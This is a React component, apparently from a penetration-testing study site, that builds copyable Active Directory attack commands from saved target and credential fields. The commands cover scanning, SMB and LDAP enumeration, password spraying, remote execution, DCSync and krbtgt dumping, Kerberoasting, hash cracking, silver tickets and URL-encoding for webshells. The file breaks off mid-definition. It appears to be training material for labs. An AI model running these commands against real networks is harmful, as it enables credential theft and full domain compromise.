import React, { useState, useMemo, useEffect } from "react";
import { nodes, PHASES } from "./utils/loadNodes";

/**
 * Command Calculator — a standalone page for The Path.
 * Saved host profiles + persistence; one active host feeds every command.
 * Auth-mode toggle (pw / hash / kerberos) and a literal ↔ $variable toggle
 * rewrite the whole command surface. Self-contained, no external deps.
 */

const FIELDS = [
  { k: "ip", label: "Target IP", ph: "10.10.10.5" },
  { k: "dcip", label: "DC IP", ph: "10.10.10.10" },
  { k: "host", label: "Hostname", ph: "dc01.corp.local" },
  { k: "domain", label: "Domain", ph: "corp.local" },
  { k: "user", label: "User", ph: "jdoe" },
  { k: "secret", label: "Password / Hash", ph: "Password123!" },
  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
  { k: "lport", label: "LPORT", ph: "4444" },
  { k: "srvport", label: "SRV PORT", ph: "80" },
  { k: "fn", label: "FILE NAME", ph: "shell.exe" },
];
// fields that count toward "ready" (lport has a working default, so it's exempt)
const CORE = ["ip", "dcip", "host", "domain", "user", "secret", "lhost"];

const AUTH = [
  { id: "pw", label: "Password" },
  { id: "hash", label: "NTLM Hash" },
  { id: "krb", label: "Kerberos" },
];

const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "", srvport: "", fn: "" });
const newHost = (name) => ({ id: `h_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`, name, fields: BLANK() });

// persistence — localStorage in the deployed Vite app. Wrapped so SSR / blocked
// storage never throws; the calc just runs without persistence if unavailable.
const STORE_KEY = "thepath.commandcalc.v1";
const store = {
  load() {
    try { return JSON.parse(localStorage.getItem(STORE_KEY) || "null"); }
    catch { return null; }
  },
  save(state) {
    try { localStorage.setItem(STORE_KEY, JSON.stringify(state)); } catch { /* ignore */ }
  },
  clear() { try { localStorage.removeItem(STORE_KEY); } catch { /* ignore */ } },
};

// split a command string into plain text + amber <TOKEN> placeholders + cyan $vars
function tokenize(cmd) {
  return cmd.split(/(<[A-Z0-9_]+>|\$[a-zA-Z_]\w*)/g).map((part, i) => {
    if (/^<[A-Z0-9_]+>$/.test(part)) return <span key={i} className="tok">{part}</span>;
    if (/^\$[a-zA-Z_]\w*$/.test(part)) return <span key={i} className="var">{part}</span>;
    return <span key={i}>{part}</span>;
  });
}

// URL-encode a command for pasting into a browser webshell query string
// (e.g. cmd.php?cmd=...). Spaces → +, reserved/special chars → %XX.
// Only the value belongs in the URL, so we encode the whole command string.
// Multi-line commands collapse to the first line — browser webshells are one-shot.
function urlEncodeCmd(cmd) {
  const firstLine = cmd.split("\n")[0];
  // encodeURIComponent handles most chars; then swap %20 → + (webshell convention)
  // and encode a few it leaves alone that still break query strings.
  return encodeURIComponent(firstLine)
    .replace(/%20/g, "+")   // spaces as + (standard for query strings)
    .replace(/'/g, "%27")   // single quote
    .replace(/\(/g, "%28")
    .replace(/\)/g, "%29")
    .replace(/\*/g, "%2A")
    .replace(/!/g, "%21");
}

function CmdCard({ label, cmd, note }) {
  const [copied, setCopied] = useState(false);
  const [enc, setEnc] = useState(false); // url-encoded view toggle
  const shown = enc ? urlEncodeCmd(cmd) : cmd;
  const copy = () => {
    navigator.clipboard?.writeText(shown);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  const toggleEnc = (e) => { e.stopPropagation(); setEnc((v) => !v); };
  return (
    <div className="cmd" onClick={copy} title="Click to copy">
      <div className="cmd-head">
        <span className="cmd-label">{label}</span>
        <span className="cmd-head-right">
          <button
            className={`cmd-url${enc ? " on" : ""}`}
            onClick={toggleEnc}
            title="Toggle URL-encoded form for browser webshells (spaces → +, specials → %XX)"
          >url</button>
          <span className={`cmd-copy${copied ? " ok" : ""}`}>{copied ? "copied" : "copy"}</span>
        </span>
      </div>
      <pre className="cmd-text">{enc ? shown : tokenize(cmd)}</pre>
      {note && <div className="cmd-note">{note}</div>}
    </div>
  );
}

// compact single-line result for the All-Path grep view
function CmdLine({ cmd, src }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="cmdline" onClick={copy} title="Click to copy">
      <pre className="cmdline-text">{tokenize(cmd)}</pre>
      <span className="cmdline-src">{copied ? "copied" : src}</span>
    </div>
  );
}

function Chip({ label, value }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="chip" onClick={copy} title="Click to copy">
      <span className="chip-label">{label}</span>
      <span className="chip-val">{copied ? "copied" : value}</span>
    </div>
  );
}

export default function CommandCalculator() {
  // ── persisted state: host profiles + active selection + modes ──
  const init = () => (typeof window !== "undefined" ? store.load() : null) || {};
  const saved = init();
  const [hosts, setHosts] = useState(
    saved.hosts && saved.hosts.length ? saved.hosts : [newHost("box 1")]
  );
  const [activeId, setActiveId] = useState(saved.activeId || null);
  const [authMode, setAuthMode] = useState(saved.authMode || "pw");
  const [varMode, setVarMode] = useState(saved.varMode || "literal"); // 'literal' | 'vars'
  const [active, setActive] = useState("setup");
  const [filter, setFilter] = useState("");
  const [mode, setMode] = useState("curated"); // 'curated' | 'all'
  const [renaming, setRenaming] = useState(null);

  // resolve the active host (fall back to first)
  const host = hosts.find((h) => h.id === activeId) || hosts[0];
  const f = host.fields;

  // persist whenever the durable bits change
  useEffect(() => {
    store.save({ hosts, activeId: host.id, authMode, varMode });
  }, [hosts, activeId, authMode, varMode]);

  // edit a field on the active host
  const set = (k) => (e) => {
    const val = e.target.value;
    setHosts((hs) => hs.map((h) => (h.id === host.id ? { ...h, fields: { ...h.fields, [k]: val } } : h)));
  };
  const addHost = () => {
    const h = newHost(`box ${hosts.length + 1}`);
    setHosts((hs) => [...hs, h]); setActiveId(h.id);
  };
  const delHost = (id) => {
    setHosts((hs) => {
      const next = hs.filter((h) => h.id !== id);
      const safe = next.length ? next : [newHost("box 1")];
      if (id === host.id) setActiveId(safe[0].id);
      return safe;
    });
  };
  const rename = (id, name) =>
    setHosts((hs) => hs.map((h) => (h.id === id ? { ...h, name: name || h.name } : h)));
  const clearAll = () => {
    store.clear();
    const h = newHost("box 1");
    setHosts([h]); setActiveId(h.id); setAuthMode("pw"); setVarMode("literal");
  };

  // ── derived tokens — literal value OR $variable, with unfilled <PLACEHOLDER> ──
  const V = varMode === "vars";
  // tok(value, $name, <PLACEHOLDER>): vars-mode shows $name when set, placeholder when not
  const tok = (val, vn, ph) => (V ? (val ? vn : ph) : (val || ph));

  const IP = tok(f.ip, "$ip", "<IP>");
  const DCIP = tok(f.dcip, "$dc", "<DC_IP>");
  const HOST = tok(f.host, "$host", "<HOST>");
  const D = tok(f.domain, "$domain", "<DOMAIN>");
  const U = tok(f.user, "$user", "<USER>");
  const SEC = tok(f.secret, "$pass", authMode === "hash" ? "<HASH>" : "<PASS>");
  const LHOST = tok(f.lhost, "$lhost", "<LHOST>");
  const LPORT = V ? (f.lport ? "$lport" : "4444") : (f.lport || "4444");
  const SRVPORT = V ? (f.srvport ? "$srvport" : "80") : (f.srvport || "80");
  const FN = V ? (f.fn ? "$fn" : "shell.exe") : (f.fn || "shell.exe");
  const baseDN = V
    ? (f.domain ? "$baseDN" : "dc=<DOMAIN>")
    : (f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>");
  const NB = V ? (f.domain ? "$nb" : "<NB>") : (f.domain ? (f.domain.split(".")[0] || "").toUpperCase() : "<NB>");
  const SUBNET = V ? (f.ip ? "$subnet" : "<SUBNET>/24") : (f.ip ? f.ip.split(".").slice(0, 3).join(".") + ".0/24" : "<SUBNET>/24");
  const hostsLine = `${IP}\t${HOST} ${D} ${HOST.split(".")[0]}`;

  // unfilled accounting (literal-mode truth: what's actually empty on the host)
  const unfilled = CORE.filter((k) => !f[k]);

  // quoting flips with var-mode: literal '…' (protect specials) vs "…" ($expansion)
  const Q = V ? '"' : "'";

  // export block to seed a shell when running in $variable mode
  const exportBlock = useMemo(() => {
    if (!V) return null;
    const real = {
      ip: f.ip, dc: f.dcip, host: f.host, domain: f.domain, user: f.user,
      lhost: f.lhost, lport: f.lport, srvport: f.srvport, fn: f.fn,
    };
    const plain = Object.entries(real).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`);
    const lines = [];
    if (plain.length) lines.push(`export ${plain.join(" ")}`);
    if (f.secret) lines.push(`export pass='${f.secret}'`);
    const derived = [];
    if (f.domain) derived.push(`baseDN='${f.domain.split(".").map((p) => `dc=${p}`).join(",")}'`);
    if (f.domain) derived.push(`nb=${(f.domain.split(".")[0] || "").toUpperCase()}`);
    if (f.ip) derived.push(`subnet=${f.ip.split(".").slice(0, 3).join(".")}.0/24`);
    if (f.fn) derived.push(`fn=${f.fn}`);
    if (derived.length) lines.push(`export ${derived.join(" ")}`);
    return lines.join("\n");
  }, [V, f]);

  // target host: Kerberos demands the hostname, everything else the IP
  const TH = authMode === "krb" ? HOST : IP;

  // ── auth-aware fragment builders (quote style follows var-mode) ──
  const impTgt = (forceHost = false) => {
    const t = authMode === "krb" || forceHost ? HOST : IP;
    if (authMode === "pw") return `${Q}${D}/${U}:${SEC}@${t}${Q}`;
    if (authMode === "hash") return `${Q}${D}/${U}@${t}${Q} -hashes :${SEC}`;
    return `${Q}${D}/${U}@${t}${Q} -k -no-pass -dc-ip ${DCIP}`;
  };
  // DC-targeted variant — DCSync / domain replication must hit the DC, not the box
  const impDC = () => {
    const t = authMode === "krb" ? HOST : DCIP;
    if (authMode === "pw") return `${Q}${D}/${U}:${SEC}@${t}${Q}`;
    if (authMode === "hash") return `${Q}${D}/${U}@${t}${Q} -hashes :${SEC}`;
    return `${Q}${D}/${U}@${t}${Q} -k -no-pass -dc-ip ${DCIP}`;
  };
  const nxcA = () => {
    if (authMode === "pw") return `-u ${Q}${U}${Q} -p ${Q}${SEC}${Q}`;
    if (authMode === "hash") return `-u ${Q}${U}${Q} -H ${Q}${SEC}${Q}`;
    return `-u ${Q}${U}${Q} -k`;
  };
  const winrmAuth =
    authMode === "pw" ? `-p ${Q}${SEC}${Q}` : authMode === "hash" ? `-H ${SEC}` : `-r ${D}`;
  const ldapAuth = `-D "${U}@${D}" -w ${Q}${SEC}${Q}`;

  // ── services ────────────────────────────────────────────
  const services = useMemo(() => ({
    setup: {
      name: "Setup", groups: [
        { phase: "Resolve & scope", cmds: [
          { label: "Add to /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Kills the stale-/.com hostname gotcha before it bites." },
        ]},
        { phase: "First-touch nmap", cmds: [
          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 5000 -T4 -Pn ${IP} -oN allports.txt` },
          { label: "Extract open ports → $PORTS", cmd: `grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,\n# Capture into a var to feed the next scan:\nPORTS=$(grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,)`, note: "Output like 21,80,135,139,443,445 — feeds straight into -p below." },
          { label: "Targeted -sCV on open ports", cmd: `echo "$PORTS"          # VERIFY non-empty before relying on it\nsudo nmap -sC -sV -p $PORTS ${IP} -oN targeted.txt`, note: "Empty $PORTS scans nothing and still looks like a clean result — echo it first." },
          { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 -Pn ${IP} -oN udp.txt` },
        ]},
        { phase: "Subnet → live hosts (greppable)", cmds: [
          { label: "Host discovery (-sn)", cmd: `nmap -sn ${SUBNET} -oG hosts.gnmap` },
          { label: "Extract live IPs → live_hosts.txt", cmd: `grep Up hosts.gnmap | cut -d ' ' -f 2 > live_hosts.txt\ncat live_hosts.txt`, note: "Greppable -oG marks reachable hosts with 'Up' — pull column 2." },
          { label: "Mass scan the live list", cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt\ngrep open mass_scan.txt`, note: "Filter quick wins: grep -E '80|443|445|22|3389|5985' mass_scan.txt" },
        ]},
      ],
    },
    enum: {
      name: "Enumeration", groups: [
        { phase: "SMB / host", cmds: [
          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
          { label: "nxc smb — users → users.txt", cmd: `nxc smb ${IP} ${nxcA()} --users | grep -Fv '[' | awk '{print $5}' | grep -v '^-' | sort -u | tee users.txt`, note: "grep -Fv '[' drops banner/auth/footer lines; grep -v '^-' drops the -Username- header. Field 5 is the account." },
          { label: "nxc smb — users (native export)", cmd: `nxc smb ${IP} ${nxcA()} --users-export users.txt`, note: "Newer NetExec builds only. Check with: nxc smb -h | grep -i export" },
          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
          { label: "nxc smb — shares (readable/writable only)", cmd: `nxc smb ${IP} ${nxcA()} --shares | grep -Fv '[' | grep -E 'READ|WRITE'`, note: "Strips the ADMIN$/C$/print$ noise you have no access to — leaves only shares worth spidering." },
          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
          { label: "nxc smb — pass policy (key lines)", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol | grep -Ei 'lockout|threshold|minimum password length|complexity'`, note: "Read this BEFORE spraying — the lockout threshold sets your attempts-per-window budget." },
          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q}` },
          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
        ]},
        { phase: "Kerbrute / userlists", cmds: [
          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
          { label: "BloodHound (python)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip` },
        ]},
      ],
    },
    ldap: {
      name: "LDAP", groups: [
        { phase: "Connect & recon", cmds: [
          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u ${Q}${U}@${D}${Q} -p ${Q}${SEC}${Q} --da` },
        ]},
        { phase: "UAC bitmask filters", cmds: [
          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
        ]},
        { phase: "Clean output → files", cmds: [
          { label: "All users → users_ldap.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee users_ldap.txt`, note: "-LLL kills comments/version blocks; -o ldif-wrap=no stops the 76-char line wrapping that splits values across lines." },
          { label: "Kerberoastable → kerb_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee kerb_users.txt`, note: "Feed straight into GetUserSPNs -usersfile." },
          { label: "AS-REP roastable → asrep_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee asrep_users.txt` },
          { label: "Descriptions (paired)", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(description=*))" sAMAccountName description | grep -Ei '^(sAMAccountName|description):'`, note: "LDIF keeps attrs adjacent per entry, so the pairs stay readable. Watch for 'description::' — double colon means base64, decode it." },
          { label: "Computers → hosts.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName | awk '/^dNSHostName:/ {print $2}' | sort -u | tee hosts.txt` },
          { label: "nxc ldap — users → file", cmd: `nxc ldap ${IP} ${nxcA()} --users | grep -Fv '[' | awk '{print $5}' | grep -v '^-' | sort -u | tee users_ldap.txt`, note: "Same column shape as nxc smb --users. Works when 445 is filtered but 389 isn't." },
          { label: "nxc ldap — password-not-required", cmd: `nxc ldap ${IP} ${nxcA()} --password-not-required | grep -Fv '[' | awk '{print $5}'`, note: "PASSWD_NOTREQD accounts — try a blank password before spraying anything." },
        ]},
      ],
    },
    smb: {
      name: "SMB", groups: [
        { phase: "Shares", cmds: [
          { label: "smbmap", cmd: `smbmap -H ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D}` },
          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U ${Q}${D}/${U}%${SEC}${Q}` },
          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U ${Q}${D}/${U}%${SEC}${Q}` },
          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
        ]},
        { phase: "Clean output → files", cmds: [
          { label: "Readable/writable shares only", cmd: `nxc smb ${IP} ${nxcA()} --shares | grep -Fv '[' | grep -E 'READ|WRITE'` },
          { label: "smbmap — hide no-access", cmd: `smbmap -H ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} | grep -Ei 'READ|WRITE'`, note: "smbmap prints NO ACCESS rows by default — this drops them." },
          { label: "Spider results → paths", cmd: `jq -r '.[] | keys[]' /tmp/nxc_hosted/nxc_spider_plus/${IP}.json | sort`, note: "spider_plus writes JSON here, not to stdout. This lists every file path it found." },
          { label: "Spider — interesting extensions", cmd: `jq -r '.[] | keys[]' /tmp/nxc_hosted/nxc_spider_plus/${IP}.json | grep -Ei '\\.(kdbx|ps1|bat|vbs|config|xml|ini|txt|bak|vhd|zip)$'`, note: "Narrows a few thousand spidered paths down to the handful that hold creds." },
          { label: "Host list → smb_hosts.txt", cmd: `nxc smb ${SUBNET} | grep -Fv '[-]' | awk '{print $2}' | sort -u | tee smb_hosts.txt`, note: "Sweep the subnet, keep only hosts that answered on 445." },
        ]},
      ],
    },
    ad: {
      name: "AD Attacks", groups: [
        { phase: "Auth & exec", cmds: [
          { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
          { label: "wmiexec (quieter)", cmd: `impacket-wmiexec ${impTgt()}` },
          { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
          { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
        ]},
        { phase: "Credentials", cmds: [
          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impDC()} -just-dc-ntlm -outputfile dcsync`, note: "Runs against the DC (uses DC IP), not the target box." },
          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impDC()} -just-dc-user Administrator` },
          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impDC()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}`, note: "Local dump — targets the box you have creds on." },
          { label: "Password spray (nxc)", cmd: `nxc smb ${IP} -u users.txt -p ${Q}${SEC}${Q} --continue-on-success`, note: "Check --pass-pol first. One spray per lockout window." },
          { label: "Password spray — hits only", cmd: `nxc smb ${IP} -u users.txt -p ${Q}${SEC}${Q} --continue-on-success | grep -F '[+]' | tee spray_hits.txt`, note: "grep -F is the safe form — '[+]' as a regex means 'a literal plus anywhere', which false-matches." },
          { label: "Spray — flag Pwn3d! (local admin)", cmd: `nxc smb ${IP} -u users.txt -p ${Q}${SEC}${Q} --continue-on-success | grep -F 'Pwn3d!'`, note: "Valid creds are useful; local admin is the actual win. Separate the two." },
        ]},
        { phase: "Roasting", cmds: [
          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt` },
          { label: "Kerberoast (impacket)", cmd: authMode === "krb"
            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
            : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt` },
          { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat so it cracks with -m 18200." },
        ]},
      ],
    },
    kerberos: {
      name: "Kerberos", groups: [
        { phase: "0 — Setup (do this first)", cmds: [
          { label: "0.1  Map the DC in /etc/hosts", cmd: `echo "${DCIP} ${HOST}.${D} ${HOST} ${D}" | sudo tee -a /etc/hosts`, note: "Kerberos matches on hostname, never IP. Every later step breaks without this." },
          { label: "0.2  Check clock drift vs the DC", cmd: `ntpdate -q ${DCIP}`, note: ">5 min off the KDC = every ticket request fails. 10 seconds here saves an hour." },
          { label: "0.3  Fix skew — faketime (preferred)", cmd: `export FT="$(ntpdate -q ${DCIP} | awk '{print $1" "$2}')"\necho $FT`, note: "Set once, reuse as: faketime \"$FT\" <command>. Leaves your system clock and TLS alone." },
          { label: "0.3b Fix skew — sync host clock", cmd: `sudo timedatectl set-ntp 0\nsudo ntpdate -u ${DCIP}\ntimedatectl status`, note: "set-ntp 0 FIRST or timesyncd undoes it in seconds. Restore later with set-ntp 1." },
        ]},
        { phase: "1 — Find targets (no tickets requested yet)", cmds: [
          { label: "1.1  List SPN accounts (no -request)", cmd: authMode === "krb"
            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U}`
            : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Enumeration only — runs over LDAP, no Kerberos, so it works even with bad clock skew. Read the Delegation column." },
          { label: "1.2  SPN accounts → kerb_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee kerb_users.txt` },
          { label: "1.3  AS-REP accounts → asrep_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee asrep_users.txt`, note: "DONT_REQ_PREAUTH accounts — roastable with no credentials at all." },
          { label: "1.4  Machine accounts are NOT worth roasting", cmd: `# Skip any SPN owned by a name ending in $ — those are 120-char\n# random machine passwords. Only human-set service accounts crack.`, note: "Reading, not running. Saves you cracking a hash that will never fall." },
        ]},
        { phase: "2 — Request the hashes", cmds: [
          { label: "2.1  Kerberoast — all SPNs", cmd: authMode === "krb"
            ? `faketime "$FT" impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
            : `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt`, note: "$FT comes from step 0.3. Drop the faketime prefix if your clock is already synced." },
          { label: "2.2  Kerberoast — one account", cmd: `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request-user sql_svc -outputfile tgs_sqlsvc.txt`, note: "Quieter, and lets you retry a single account without re-requesting everything." },
          { label: "2.3  Kerberoast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt`, note: "Writes straight to file. Handy if impacket is misbehaving." },
          { label: "2.4  AS-REP roast — from userlist", cmd: `faketime "$FT" impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile asrep_users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat or it writes john format and -m 18200 rejects it." },
          { label: "2.5  AS-REP roast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
        ]},
        { phase: "3 — VERIFY you got hashes", cmds: [
          { label: "3.1  Did the file get written?", cmd: `ls -l tgs.txt asrep.txt 2>/dev/null`, note: "THE step people skip. A clean-looking SPN table with no file means the ticket request failed — go back to step 0.2." },
          { label: "3.2  Count the hashes", cmd: `grep -c 'krb5tgs' tgs.txt\ngrep -c 'krb5asrep' asrep.txt`, note: "Zero here means enumeration worked and roasting didn't. Not the same thing." },
          { label: "3.3  Check the encryption type", cmd: `cut -d'$' -f2,3 tgs.txt | sort -u`, note: "23 = RC4 -> hashcat -m 13100. 18 = AES256 -> -m 19700. Wrong mode looks like 'no hashes loaded'." },
        ]},
        { phase: "4 — Crack", cmds: [
          { label: "4.1  Kerberoast — straight rockyou", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Try this bare first. Service accounts set years ago fall in seconds." },
          { label: "4.2  Kerberoast — with rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "Rules missing? find / -name 'best64.rule' 2>/dev/null — otherwise: apt install --reinstall hashcat" },
          { label: "4.3  AS-REP crack", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` },
          { label: "4.4  AES-encrypted TGS (etype 18)", cmd: `hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Only if step 3.3 showed 18. Much slower than RC4 — expect it." },
          { label: "4.5  Show what cracked", cmd: `hashcat -m 13100 tgs.txt --show | awk -F: '{print $NF}'\nhashcat -m 13100 tgs.txt --show | sed 's/.*\\*\\([^$]*\\)\\$.*:/\\1:/'`, note: "Recovers results from the potfile without re-running the attack." },
        ]},
        { phase: "5 — Use the credential (do NOT skip)", cmds: [
          { label: "5.1  Every service, every host", cmd: `for svc in smb winrm mssql rdp ssh; do\n  echo "=== $svc ==="\n  nxc $svc ${IP} -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} 2>/dev/null | grep -F '[+]'\ndone`, note: "The single highest-value step in this whole list. Do it before any further technique." },
          { label: "5.2  Try for an interactive shell", cmd: `evil-winrm -i ${HOST}.${D} -u <CRACKED_USER> -p '<CRACKED_PASS>'\nimpacket-mssqlclient ${D}/<CRACKED_USER>:'<CRACKED_PASS>'@${IP} -windows-auth`, note: "No (Pwn3d!) does NOT mean no access — WinRM and MSSQL rights are invisible to that check." },
          { label: "5.3  Spray it at every account", cmd: `nxc smb ${SUBNET} -u users.txt -p '<CRACKED_PASS>' --continue-on-success | grep -F '[+]'`, note: "Admins reuse service account passwords constantly." },
          { label: "5.4  Re-run BloodHound as the new user", cmd: `bloodhound-python -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} -ns ${DCIP} -c All --zip`, note: "New identity can see graph edges the old one couldn't." },
        ]},
        { phase: "6 — If it won't crack", cmds: [
          { label: "6.1  Bigger wordlist / heavier rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`, note: "Long shot on a laptop CPU. Time-box it and keep enumerating in parallel." },
          { label: "6.2  Silver ticket — no cracking needed", cmd: `impacket-ticketer -nthash <NTHASH_OF_SVC_ACCT> -domain-sid <DOMAIN_SID> -domain ${D} -spn <SERVICE>/<HOST>.${D} Administrator\nexport KRB5CCNAME=$PWD/Administrator.ccache`, note: "Only works for the service that account OWNS. WinRM and CIFS belong to the MACHINE account, not a user — check who holds the SPN first." },
          { label: "6.3  Check delegation on the SPN account", cmd: `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} | awk '{print $NF}'`, note: "An unconstrained/constrained delegation flag is a bigger win than the password." },
          { label: "6.4  Move on", cmd: `# Uncrackable service account is a dead end, not a puzzle.\n# Go back to BloodHound ACLs, shares, and the web app.`, note: "Reading, not running. Roasting is one branch, not the path." },
        ]},
        { phase: "7 — Error decoder", cmds: [
          { label: "KRB_AP_ERR_SKEW", cmd: `ntpdate -q ${DCIP}`, note: "Clock skew. Back to step 0.2/0.3." },
          { label: "CCache file is not found. Skipping...", cmd: `# Harmless. Impacket checks for KRB5CCNAME, finds none,\n# falls back to your password. Not an error.`, note: "Reading, not running. Everyone panics at this line once." },
          { label: "No hashes, no outputfile, clean SPN table", cmd: `ls -l tgs.txt`, note: "Enumeration is LDAP, roasting is Kerberos. The table succeeding proves nothing about the request." },
